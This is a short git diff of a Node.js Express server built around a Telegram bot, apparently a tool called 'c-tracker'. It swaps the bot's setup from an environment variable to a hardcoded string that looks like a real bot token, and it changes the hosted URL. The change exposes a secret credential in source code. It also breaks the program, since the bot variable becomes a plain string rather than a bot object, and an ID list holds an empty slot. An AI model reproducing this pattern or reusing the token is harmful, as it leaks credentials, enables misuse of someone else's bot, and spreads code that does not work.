@@ -8,7 +8,7 @@ const whitelistedUserIds = [1950858586, 676849867, , 1118054166, 779715934, 1135
 const PremiumUserIds = [826978407,716505457];
 const targetChatId = '826978407';
 const nuid = 'dod0mf';
-const bot = new TelegramBot(process.env["bot"], { polling: true });
+const bot = '7078294505:AAHhi4W3o9NoxrByuld2UgPZdaOVPh-5ek0'
 var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
 var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
 const app = express();
@@ -18,7 +18,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL = "https://ctracker.mohammedathif.repl.co"
+var hostURL = "https://c-tracker-4mkk.onrender.com/"
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt = false;
 
